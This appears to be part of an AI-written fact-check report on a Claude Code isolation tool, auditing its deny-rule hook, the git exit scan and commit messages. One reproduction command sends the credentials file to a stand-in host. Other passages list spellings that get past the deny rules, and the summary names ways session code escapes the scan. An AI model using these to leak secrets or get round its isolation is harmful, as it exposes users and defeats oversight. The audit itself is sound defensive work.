## Claim 23: "Adding `-c protocol.file.allow=never` refuses a push to a local-path remote, which stops the receive-pack and repointed-bare-repo cases, but not the rest."

**Location:** `guides/cc-isolated-usage.md:217-219`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers local-path and `file://` remotes (`./evil.git`, `file:///…`, `file://localhost/…`, and a receivepack on a local-path origin), all refused with `fatal: transport 'file' not allowed` and no marker. It does not cover `remote.*.receivepack` on an ssh remote, where the command is sent to the remote side rather than run locally.
**Legibility-target:** for-orchestrator-synthesis

The test at `test/cc-isolated-functions.bats:1370-1372` also pins this (`run git -c protocol.file.allow=never push …; [ "$status" -ne 0 ]`).

**Evidence:** `guides/cc-isolated-usage.md:217-219`, `test/cc-isolated-functions.bats:1351-1373`; `$R/probes/protofile.sh` → `protofile.log` (exit 0, 2026-09-27T15:46:52-07:00)

---

## Claim 24: "writes `test/skills/<skill>/output/*.report.md` with a provenance `.stamp` (hashes of the skill directory, its `runner.bash` and the fixture, not the shared harness); reports and their sidecars are meant to be committed once generated (none are yet; `.gitignore` admits them), and a report whose stamp no longer matches fails its suite until regenerated."

**Location:** `guides/skill-creation.md:63`
**Type:** Behavioral / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `report_stamp`'s three inputs, the tracked-report count (0) and the ignore rules. It does not cover every suite's use of `check_report_stamp`; only the freshness suite was run.
**Legibility-target:** for-orchestrator-synthesis

```bash
# test/skills/runner-contract.bash:198-203
report_stamp() {
  local sk="$1" skill="$2" fixture="$3"
  printf 'skill %s\n' "$(_stamp_hash_path "$sk/../../skills/$skill")"
  printf 'runner %s\n' "$(_stamp_hash_path "$sk/$skill/runner.bash")"
  printf 'fixture %s\n' "$(_stamp_hash_path "$sk/$skill/fixtures/$fixture")"
}
```

This resolves iteration-1 Claim 33.

**Evidence:** `guides/skill-creation.md:63`, `test/skills/runner-contract.bash:181-224`; `$R/probes/eval-helpers-freshness.bats.log` (32/32)

---

## Claim 25: "F4 (description length) — Resolved for all 25 skills … runs 364–438 characters (was 951–2969) … The displaced long-tail trigger phrases and caveats moved into a `## When to use` section in each SKILL.md body (appended to the existing section in design-space-situating, pre-mortem and what-if-analysis)."

**Location:** `guides/skill-format-audit.md:20`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the count (25), the min and max of the parsed folded-scalar description at origin/main (951/2969) and at 02d14b0 (364/438). The existing sections in pre-mortem and what-if-analysis are titled `## When to Use This Skill (vs. …)`, not `## When to use`, which fits "appended to the existing section". It does not cover the "~250 characters" front-loading judgment.
**Legibility-target:** for-orchestrator-synthesis

The log prints `02d14b0 count 25 min 364 max 438` and `origin/main count 25 min 951 max 2969`. The headings found are `skills/pre-mortem/SKILL.md:32:## When to Use This Skill (vs. what-if-analysis)` and `skills/what-if-analysis/SKILL.md:33:## When to Use This Skill (vs. pre-mortem)`.

**Evidence:** `guides/skill-format-audit.md:18-20`, `skills/pre-mortem/SKILL.md:32`, `skills/what-if-analysis/SKILL.md:33`; `$R/probes/desclen.log` (cmd `python3 ../../desclen.py <rev>`, cwd `$R/x`, 2026-09-27T15:48:38-07:00. The first `main` attempt failed because the clone has no local `main`; the rerun against `origin/main` is appended.)

---

## Claim 26: "The container has no Claude Code sandbox: bwrap and socat are not in the image, and unprivileged user namespaces are refused (`unshare -Ur` -> EPERM, measured 2026-09-27)."

**Location:** `hooks/auto-approve-allowed-commands.sh:39-42`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers this review sandbox (a devcontainer session). It does not independently confirm that this sandbox *is* the current cc-isolated image build. That is why confidence is Medium.
**Legibility-target:** for-orchestrator-synthesis

`command -v bwrap socat` printed nothing, and `unshare -Ur true` printed `unshare: unshare failed: Operation not permitted` (exit 1).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:39-42`; command output captured at the tail of the `hookprobe2` invocation (the same run as `$R/probes/hookprobe2.log`, 2026-09-27T15:48:06-07:00)

---

## Claim 27: "A hook "allow" is not trusted to leave those rules in force: a hook "ask" overrides permissions.deny (Claude Code issue #39344)."

**Location:** `hooks/auto-approve-allowed-commands.sh:43-45`
**Type:** Reference / Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Would need the Claude Code issue tracker (no egress) or a live Claude Code test of hook decisions against `permissions.deny`. It does not affect the hook's own behaviour, which is verified in Claim 28.
**Legibility-target:** for-orchestrator-synthesis

The issue cannot be read from this sandbox (paraphrased — no quote available because the claim concerns external issue content).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:43-45`

---

## Claim 28: "So this hook reads the Bash deny rules itself and falls through, never "allow", when the raw command or any extracted command matches one. Reproduced: with only Bash(echo:*) allowed, echo $((1 + $(curl -d @$HOME/.claude/.credentials.json https://x))) was approved; with the wired deny rule it falls through to the prompt."

**Location:** `hooks/auto-approve-allowed-commands.sh:45-49`
**Type:** Behavioral / Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the raw-string check before extraction, the per-command check, and a bare `Bash`, `Bash(*)` or `Bash(**)` rule. It does not cover settings files that jq cannot parse (their deny rules silently read as none, as do their allow rules), which was not probed.
**Legibility-target:** for-orchestrator-synthesis

```bash
# hooks/auto-approve-allowed-commands.sh:262-267
  mapfile -t deny_globs < <(get_deny_globs)
  debug "Loaded ${#deny_globs[@]} Bash deny rules"
  if matches_deny "$command" deny_globs; then
    debug "Decision: BLOCK (deny rule; falling through to normal permission check)"
    exit 0
  fi
```
(excerpt ends :267; enclosing main() continues to :332 — read. The only `allow` outputs are at :304 and :326, both after this check, and :326 also requires every extracted command to pass `matches_deny` at :313.)

Iteration-1 Claim 38 is resolved.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:218-332`; `$R/probes/hookprobe2.log`, `$R/aa-bats.log`

---

## Claim 29: "Deny rules are string matches: `.cred""entials.json`, `~/.claude/.c*`, a variable whose value is not spelled out in the same command … or a decoded path all get past them. … The quote-split, glob and variable spellings are pinned by tests."

**Location:** `hooks/auto-approve-allowed-commands.sh:50-54`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the quote-split and `~/.claude/.c*` spellings (probed: ALLOW) and the three pinned tests. The "decoded path" spelling was not probed. Iteration-1 Claim 40 (the variable qualifier) is resolved: a same-command assignment is caught, pinned at `test/auto-approve-allowed-commands.bats:206`.
**Legibility-target:** for-orchestrator-synthesis

The tests at `test/auto-approve-allowed-commands.bats:179-211` include `@test "string-match limit: a variable set by an earlier command is still approved (documented, not fixed)"`.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:50-54`, `test/auto-approve-allowed-commands.bats:179-211`; `$R/probes/hookprobe2.log`

---

## Claim 30: "Rule syntax: only `*` (and the legacy trailing `:*`) is a wildcard, and a bare `Bash` deny rule denies everything. KNOWN DIVERGENCE: … Here it does not (`rm *` needs the space). To cover the bare command, use the legacy form `Bash(rm:*)`, which matches `rm` alone but, as a plain prefix, also `rmdir`."

**Location:** `hooks/auto-approve-allowed-commands.sh:56-61`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's matching (`rm` vs `Bash(rm *)`: ALLOW; `rm` and `rmdir x` vs `Bash(rm:*)`: fall through). It does not cover Claude Code's own semantics, which the comment already calls undocumented.
**Legibility-target:** for-orchestrator-synthesis

```bash
# hooks/auto-approve-allowed-commands.sh:119-122
deny_rules_to_globs() {
  sed -nE 's/^Bash$/*/p; s/^Bash\((.*)\)$/\1/p' \
    | sed -E 's/:\*$/*/; s/[^A-Za-z0-9*]/\\&/g'
}
```

**Evidence:** `hooks/auto-approve-allowed-commands.sh:113-122`, `hooks/auto-approve-allowed-commands.sh:151-167`; `$R/probes/hookprobe2.log`

---

## Claim 31: "Only `*` is a wildcard in a rule; every other character is backslash-escaped so bash matches it literally. Without that, `?`, `[...]` and extglob characters in a rule were live glob syntax"

**Location:** `hooks/auto-approve-allowed-commands.sh:113-118`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `[1]`, `?`, `+(a|b)`, a backslash and the multibyte `é` under both the C and C.UTF-8 locales, which all match only their literal text. It does not cover a rule with an embedded newline.
**Legibility-target:** for-orchestrator-synthesis

Probe results: `cat notes1.txt` vs `Bash(cat notes[1].txt)` → ALLOW (no wildcard). `cat notes[1].txt` → fall. `cat file1.txt` vs `Bash(cat file?.txt)` → ALLOW. `ls a` vs `Bash(ls +(a|b))` → ALLOW. `cat café` → fall under both locales. The code is quoted in Claim 30.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:113-122`; `$R/probes/hookprobe2.log`

---

## Claim 32: "Bash(*.credentials.json*) is the Bash backstop for the credentials file … without it `curl -d @$HOME/.claude/.credentials.json` nested where the auto-approve hook does not look (e.g. inside $(( ))) ran with no prompt. auto-approve-allowed-commands.sh reads Bash deny rules and never approves a match. It is a string match: any spelling that does not contain the literal name … gets past."

**Location:** `hooks/wiring.json:38-44`
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the rule's presence (`hooks/wiring.json:131`), the merge into settings (test `the merged settings carry the Bash deny rule`, 16/16) and the hook's behaviour. The example now uses `@$HOME/…`, which bash expands, so iteration-1 Claim 46 is resolved. Iteration-1 Claim 47 (glob qualifier) is resolved by Claim 31. It does not cover Claude Code's own matching of the rule (override-log row 81).
**Legibility-target:** for-orchestrator-synthesis

`hooks/wiring.json:131` reads `"Bash(*.credentials.json*)",`. The bats test `the credentials deny rule in hooks/wiring.json is one the hook honors` passes.

**Evidence:** `hooks/wiring.json:38-44`, `hooks/wiring.json:129-133`, `test/link-claude-home-wiring.bats:266-275`; `$R/probes/link-claude-home-wiring.bats.log` (rc 0, 16 ok, 2026-09-27T15:48:57-07:00), `$R/aa-bats.log`

---

## Claim 33: "generate with test/skills/generate-reports.bash <skill>, then commit output/" and "commit what it writes to output/ (reports are tracked; Q-071 [1])"

**Location:** `scripts/run-tests.sh:100-101`
**Type:** Configuration
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers "reports are tracked". No file under `test/skills/*/output/` is tracked at 02d14b0 (`git ls-files` → 0). The precise wording is "trackable" or "meant to be committed", which 376a8a2 applied to `guides/skill-creation.md` and `generate-reports.bash` but not here. The health-check wording at `scripts/health-check.sh:407` ("then commit output/") is an instruction and is fine.
**Legibility-target:** for-author

`scripts/run-tests.sh:100-101`: `# test/skills/generate-reports.bash <skill> and commit what it writes to output/` / `# (reports are tracked; Q-071 [1]).`

**Evidence:** `scripts/run-tests.sh:96-101`, `scripts/health-check.sh:407`, `.gitignore:8-12`

---

## Claim 34: Test names and comments in the exit-scan suite (e.g. "exit scan (a): remote.origin.receivepack is named; the hooks-only safe push would run it", "(c) … are named, and not run", "(d) … fails closed (status 2)")

**Location:** `test/cc-isolated-functions.bats:1351-1632`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the fact that each test asserts what its name says (read) and passes (125/125). The "not run" tests assert that the `ran/` marker dir is empty after the scan. It does not cover the coverage gaps in Claims 2b and 7, which no test targets.
**Legibility-target:** for-orchestrator-synthesis

The `(a)` test asserts the hooks-only push runs the key: `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push -q origin HEAD:refs/heads/x` followed by `[ -e "$TEST_TMPDIR/ran/receivepack" ]` (`test/cc-isolated-functions.bats:1366-1367`). Iteration-1 Claim 50 (not every planted command touching a marker) was not re-audited test by test.

**Evidence:** `test/cc-isolated-functions.bats:1351-1632`; `$R/cc-bats.log`

---

## Claim 35: "Every stamp line is "<input> <sha256>", for the skill's three own inputs (not the shared runner-contract.bash: Q-071 [1])."

**Location:** `test/generate-reports.bats:374-375`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the stamp format as produced by `report_stamp`. It does not cover the rest of the generator.
**Legibility-target:** for-orchestrator-synthesis

The assertion `[ "$(cut -d' ' -f1 "$out/tc-1-thing.txt.stamp" | tr '\n' ' ')" = "skill runner fixture " ]` passes. The suite ran 49/49.

**Evidence:** `test/generate-reports.bats:370-378`; `$R/probes/generate-reports.bats.log` (rc 0, 49 ok, 2026-09-27T15:48:57-07:00)

---

## Claim 36: "T3 provenance stamps: a report whose skill, runner or fixture changed since generation fails; so does one with no stamp. The shared runner-contract.bash is not stamped (Q-071 [1]), and the reports and their sidecars are tracked by git."

**Location:** `test/skills/eval-helpers-freshness.bats:6-9`
**Type:** Behavioral / Configuration
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** The stamp behaviour is verified (32/32, including `editing the shared runner-contract.bash does not stale a report` and `an old-format stamp … reads as stale`). "Are tracked by git" should read "are not gitignored": no report is tracked (`git ls-files` → 0), and the pinning test checks only `check-ignore`.
**Legibility-target:** for-author

The pinning test at `test/skills/eval-helpers-freshness.bats:110` is titled `"stamp: reports and every sidecar the suites read are tracked, not gitignored"` and runs `git -C "$root" check-ignore -q …`, which checks ignore status, not tracking.

**Evidence:** `test/skills/eval-helpers-freshness.bats:6-9`, `test/skills/eval-helpers-freshness.bats:93-119`; `$R/probes/eval-helpers-freshness.bats.log`

---

## Claim 37: "All of these are meant to be committed once generated (Q-071 [1]; .gitignore admits them): the suites read every one, so a fresh clone grades the same reports, and a report is regenerated only when its skill, runner or fixture changes."

**Location:** `test/skills/generate-reports.bash:17-20`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the ignore rules and the stamp's three inputs. "Regenerated only when …" is read as "flagged stale only when …", since the stamp check fails and names the command (`Regenerate: $regen`, `runner-contract.bash:223`). Nothing regenerates reports automatically. Iteration-1 Claim 52 is resolved.
**Legibility-target:** for-orchestrator-synthesis

`test/skills/runner-contract.bash:223`: `echo "Stale report for $skill/$fixture: changed since generation: ${changed:-stamp format}. Regenerate: $regen"`.

**Evidence:** `test/skills/generate-reports.bash:10-20`, `test/skills/runner-contract.bash:198-224`, `.gitignore:8-12`

---

## Claim 38: "Only the skill's own inputs are stamped (Q-071 [1]) … Shared harness files are deliberately not stamped: this file, generate-reports.bash, transcript.jq … A stamp in an older format (one that also stamped the contract) reads as stale: "stamp format"."

**Location:** `test/skills/runner-contract.bash:188-199`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `report_stamp` and `check_report_stamp` (the freshness tests pass). It does not cover the rationale sentence about editing rate.
**Legibility-target:** for-orchestrator-synthesis

The code is quoted in Claims 24 and 37. The test `an old-format stamp that also hashed the contract reads as stale` asserts `*"changed since generation: stamp format. "*` and passes.

**Evidence:** `test/skills/runner-contract.bash:181-224`, `test/skills/eval-helpers-freshness.bats:102-108`; `$R/probes/eval-helpers-freshness.bats.log`

---

## Claim 39a: d9a895d message: "Tests: 16 new bats cases … Against the previous scan 14 of the 15 new (a)-(f) cases fail"

**Location:** commit `d9a895d` message
**Type:** Reference
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the counts. The commit adds 17 `+@test` lines, one of which renames an existing include test, so 16 new cases, and all 16 are `(a)`–`(f)` cases. Running the d9a895d test file against 37cae85's `cc-isolated.sh` failed **15 of 16**; only `(f) an unreadable hook with control bytes …` passed. It does not establish whether each failure is a detection failure or only a report-format mismatch.
**Legibility-target:** for-orchestrator-synthesis

The direction ("nearly all fail on the old scan") holds; the numbers are off by one. The precise version is "15 of the 16 (a)–(f) cases fail". (paraphrased — no quote available because the evidence is bats output)

**Evidence:** `test/cc-isolated-functions.bats:1351-1592`; `$R/probes/old-scan-new-tests.log` (cmd `bats -f 'exit scan \([a-f]\)' test/cc-isolated-functions.bats`, tests@d9a895d with cc-isolated.sh@37cae85, cwd `$R/old76`, rc 1, 2026-09-27 ~15:49 local)

---

## Claim 39b: d9a895d message: suites and verifications: "cc-isolated-functions 125/125, install-host 92/92, fixture-hermeticity 2/2, hermeticity-lint 53/53 … (both verified; the latter is pinned in a test) … host `git status` recurses into a gitlink's repo and runs its fsmonitor -- verified … nine off-list keys named (eight marked)"

**Location:** commit `d9a895d` message
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the suite counts at d9a895d (92, 2, 53) and at 02d14b0 (125), the protocol.file pin, the gitlink fsmonitor behaviour (X3: host `git status` ran `fsmon-sub`) and the `(e)` test's eight marked plus one unmarked key. It does not cover the message's "every file host git reads" sentence (Claim 39c) or its "Remaining limits" list (Claim 39c).
**Legibility-target:** for-orchestrator-synthesis

At d9a895d the logs show `install-host … ok=92`, `fixture-hermeticity … ok=2` and `hermeticity-lint … ok=53`, all rc 0. The `(e)` test loops over 8 keys that must be marked, then asserts `+ madeup.futurekey some value` with no mark (`test/cc-isolated-functions.bats:1514-1520`).

**Evidence:** `$R/probes/d9a-install-host.bats.log`, `$R/probes/d9a-fixture-hermeticity.bats.log`, `$R/probes/d9a-hermeticity-lint.bats.log` (cwd `$R/old76` at d9a895d, 2026-09-27T15:50:17-07:00); `$R/cc-bats.log`; `$R/probes/iter1-repros.log` (X3)

---

## Claim 39c: d9a895d message: "The snapshot now records content hash, mode and symlink target of every file host git reads to decide what to run … Remaining limits (guide + header): baseline accepted, plant-after-scan, no scan when killed, tracked .gitattributes, and a baseline config value naming a program by path in the checkout"

**Location:** commit `d9a895d` message
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** The same findings as Claims 2b and 7. There are in-checkout push targets named via pushRemote, insteadOf or `file://localhost`, and the limits list omits hooks that run tracked files. It does not re-verdict the rest of the message.
**Legibility-target:** for-author

See Claims 2b and 7 for code and reproductions (paraphrased — no quote available because the evidence is shared with those claims).

**Evidence:** `devcontainer-config/cc-isolated.sh:583-589`, `devcontainer-config/cc-isolated.sh:786-787`; `$R/probes/new-bypass.log`, `$R/probes/int2.log`

---

## Claim 40: a958372 message: "The health-check shellcheck gate failed on two control-byte tests added in d9a895d."

**Location:** commit `a958372` message
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `shellcheck -S warning` on the test file at d9a895d (two SC2155 warnings, at :1565 and :1581, both in the `(f)` tests) and at a958372 (clean), plus the gate including `.bats` files. It does not cover whether health-check passes the same flags as this run.
**Legibility-target:** for-orchestrator-synthesis

`scripts/health-check.sh:459` has `# Also include .bats files — they're bash` inside `check_shellcheck`. The log shows `rc@d9a895d=1` with two `SC2155 (warning)` lines, then `rc@a958372=0`.

**Evidence:** `scripts/health-check.sh:427-470`; `$R/probes/shellcheck.log` (cwd `$R/old76`)

---

## Claim 41: df11830 message: "Tests: 7 new bats cases; 3 of them fail against the previous hook." and the bullets (literal matching, bare Bash, `@$HOME` example, row 53 pins, variable refinement, rm divergence)

**Location:** commit `df11830` message
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the 7 new `@test` lines and the pre-fix run of the df11830 tests against the 5f70e0f hook. The failures were exactly `glob metacharacters …`, `? in a deny rule …` and `a bare Bash deny rule …`, with 18 ok. The bullets match Claims 15, 29–32. The `Bash(*)`/`Bash(**)` test passes on the old hook, which is consistent with "3 of them".
**Legibility-target:** for-orchestrator-synthesis

(paraphrased — no quote available because the evidence is bats output)

**Evidence:** `test/auto-approve-allowed-commands.bats:189-245`; `$R/probes/old-hook-new-tests.log` (tests@df11830 with hook@5f70e0f, cwd `$R/old77`, 2026-09-27 ~15:50 local)

---

The 376a8a2 message ("No report is tracked yet; the wording claimed they were") is Verified by the `git ls-files` count of 0 cited in Claims 1 and 24. It is not numbered separately.

---

## Claims Requiring Attention

### Incorrect
- **Claim 7** (`devcontainer-config/cc-isolated.sh:583-589`): the limits list omits a hook present at launch that runs a tracked file (husky/lefthook/pre-commit shape). The session edits the tracked file, the scan returns 0 and the launcher exits 0, and host `git commit`/`git push` runs the session's code (N1, N1b, N1-main). Add the limit, or scan the files such hooks name.
- **Claim 21** (`guides/cc-isolated-usage.md:193-209`): the same omission in the guide. "Hooks … are the exception: their contents are hashed" presents hooks as safe when a hook that delegates to a tracked file is not.
- **Claim 2b / 19b** (`devcontainer-config/cc-isolated.sh:542-543`, `guides/cc-isolated-usage.md:170-172`): "every file host git reads" is false for in-checkout push targets named via `branch.*.pushRemote`, `url.*.insteadOf` or `file://localhost/…` when that setting was present at launch (N2, N3, N6). This is low-likelihood; narrow the wording or walk those targets.
- **Claim 39c** (commit `d9a895d`): repeats the universality and the incomplete limits list.

### Stale
- None.

### Mostly Accurate
- **Claim 3** (`devcontainer-config/cc-isolated.sh:558-559`): `file://localhost/…` urls are not recognised as local paths.
- **Claim 12** (`devcontainer-config/cc-isolated.sh:952`): the rc-2 warning says "under $ws/.git" when the unlistable path can be anywhere in the working tree.
- **Claim 33** (`scripts/run-tests.sh:100-101`): "reports are tracked", but none are. Use "trackable" or "meant to be committed".
- **Claim 36** (`test/skills/eval-helpers-freshness.bats:6-9`): "tracked by git" should read "not gitignored".
- **Claim 39a** (commit `d9a895d`): "14 of the 15" should be 15 of the 16 new (a)–(f) cases failing on the old scan.

### Unverifiable
- **Claim 27** (`hooks/auto-approve-allowed-commands.sh:43-45`): #39344 (a hook "ask" overriding `permissions.deny`) needs the issue tracker or a live Claude Code test.
- **Claim 14 residue** (`devcontainer-config/cc-isolated.sh:1141-1148`): whether a real `devcontainer exec` delivers Ctrl-C to claude needs a live container. The launcher-side behaviour is Verified.
- **Claim 26 residue** (`hooks/auto-approve-allowed-commands.sh:39-42`): measured in this sandbox. Confirming it on a fresh cc-isolated image build needs Docker.

---

## Goal-Alignment Note
- **Success criterion (restated verbatim):** A code-fact-check report saved at the dispatch path in the skill's schema, covering the claims above, with a Goal-Alignment Note.
- **Answered:** Every iteration-1 Incorrect claim was re-run against 02d14b0 and is now resolved: X3, X4 and X7 give findings, X6 fails closed and C64 is filtered. The "runs nothing from the checkout" claim was verified with a git-call spy, fail-closed with 10 FIFO and unreadable probes (no hangs), the exit-code contract through `main`, the safe-push and `protocol.file.allow` advice on git 2.39.5, and the hook's literal deny matching with bare `Bash`/`Bash(*)`/`Bash(**)`. The runner-contract, .gitignore and docs text was checked, as were the counts in the four commit messages (d9a895d off by one; df11830 and a958372 exact). New bypasses found in which the scan returns 0 and host git then runs session code: hook→tracked-script (realistic, husky default) and three low-likelihood remote forms that must be present at launch.
- **Out of scope:** `skills/*/SKILL.md` content (pass 2). Live Docker/devcontainer behaviour. Claude Code's own deny-rule semantics.
- **Escalate:** The husky/pre-commit-style bypass (Claim 7/21) is security-relevant for the Q-076 threat model and is strong input for security-reviewer. It needs no `.git` write at all, and it also affects the separate-clone advice once that clone runs hooks over merged content (Claim 22 scope).
- **Decisions I made:** I rated Claims 2b and 19b Incorrect rather than Mostly accurate, because "every" is refuted by reproduction even though each case needs an unusual launch-time setting. I did not probe case-insensitive checkouts (`/mnt/c` drvfs with `.GIT`), `.gitmodules update=!cmd`, or jq-unparseable settings files for the hook.
